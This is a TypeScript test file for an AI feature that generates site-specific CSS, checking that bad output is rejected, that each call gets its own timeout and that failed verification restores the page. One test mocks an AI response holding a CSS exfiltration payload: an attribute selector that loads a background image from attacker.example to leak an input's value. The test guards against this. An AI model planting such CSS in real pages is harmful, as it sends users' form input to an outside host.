import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { CommandBus } from "../../bus/command-bus";
import { EventBus } from "../../bus/event-bus";
import { MemoryDataStore } from "../../data/memory-store";
import { createMockPlatform, makeTab } from "../../test-utils";
import domainCss from "../domain-css/domain-css.main";
import type { DomainCssCommands, DomainCssEvents } from "../domain-css/domain-css.shared";
import type { TabsCommands, TabsEvents } from "../tabs/tabs.shared";
import ai from "./ai.main";
import type { AiCommands, AiEvents } from "./ai.shared";
import type { AiProvider } from "./chatgpt-client.main";

type Commands = AiCommands &
  DomainCssCommands &
  Pick<TabsCommands, "tabs:create" | "tabs:activate">;
type Events = AiEvents & DomainCssEvents & Pick<TabsEvents, "tabs:updated" | "tabs:closed">;
let directory: string;
beforeEach(() => {
  directory = fs.mkdtempSync(path.join(os.tmpdir(), "ai-css-generation-"));
});
afterEach(() => {
  ai.teardown?.();
  domainCss.teardown?.();
  vi.useRealTimers();
  fs.rmSync(directory, { force: true, recursive: true });
});
const payload = {
  id: "00000000-0000-4000-8000-000000000001",
  domain: "example.com",
  request: "Make the heading red",
};

async function setup() {
  const commands = new CommandBus<Commands>();
  const events = new EventBus<Events>();
  const dataStore = new MemoryDataStore();
  const tab = makeTab();
  const tabs = new Map([[tab.id, tab]]);
  const platform = createMockPlatform({
    getTabUrl: vi.fn(() => tab.url),
    executeJavaScript: vi.fn(async () => "<h1>Heading</h1>"),
  });
  const provider: AiProvider = {
    status: () => ({ connected: true, sharing: true }),
    load: vi.fn(async () => {}),
    connect: vi.fn(async () => {}),
    disconnect: vi.fn(async () => {}),
    models: vi.fn(async () => [{ slug: "gpt-6-luna", name: "GPT-6 Luna", efforts: ["high"] }]),
    respond: vi
      .fn()
      .mockResolvedValueOnce("h1 { color: red; }")
      .mockResolvedValueOnce("The heading is red."),
  };
  const deps = {
    commands,
    events,
    dataStore,
    platform,
    dataDir: directory,
    getTabsSnapshot: () => tabs,
  };
  domainCss.register(deps);
  await domainCss.start?.(deps);
  ai.register({
    ...deps,
    provider,
    getActivePageTabId: () => tab.id,
    getPageSnapshots: () => tabs,
  });
  await ai.start?.();
  return { commands, provider, platform };
}
describe("CSS generation checks", () => {
  it("rejects remote resources before preview or persistence", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValue('input[value^="a"] { background: url(https://attacker.example/a); }');
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow(
      "previous CSS is unchanged",
    );
    expect(platform.insertCSS).not.toHaveBeenCalled();
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      enabled: false,
      hasFile: false,
    });
  });
  it("allows each sequential AI call its own time budget", async () => {
    const { commands, provider } = await setup();
    vi.useFakeTimers();
    let count = 0;
    vi.mocked(provider.respond)
      .mockReset()
      .mockImplementation(
        ({ signal }) =>
          new Promise((resolve, reject) => {
            const call = count++;
            const timer = setTimeout(
              () => resolve(call === 0 ? "h1 { color: red; }" : "The heading is red."),
              call === 0 ? 75000 : 140000,
            );
            signal.addEventListener(
              "abort",
              () => {
                clearTimeout(timer);
                reject(signal.reason);
              },
              { once: true },
            );
          }),
      );
    const result = commands.send("ai:generate-css", payload);
    await vi.advanceTimersByTimeAsync(76000);
    await vi.advanceTimersByTimeAsync(141000);
    await expect(result).resolves.toMatchObject({ message: expect.stringContaining("CSS saved") });
  });
  it("restores the preview and keeps saved CSS unchanged when visual verification fails", async () => {
    const { commands, provider, platform } = await setup();
    vi.mocked(provider.respond)
      .mockReset()
      .mockResolvedValueOnce("h1 { color: red; }")
      .mockRejectedValueOnce(new Error("ChatGPT usage limit reached. Manage usage in Settings."));
    await expect(commands.send("ai:generate-css", payload)).rejects.toThrow("usage limit");
    expect(platform.removeInsertedCSS).toHaveBeenCalled();
    expect(await commands.send("domain-css:get-state", { domain: payload.domain })).toMatchObject({
      enabled: false,
      hasFile: false,
    });
  });
});
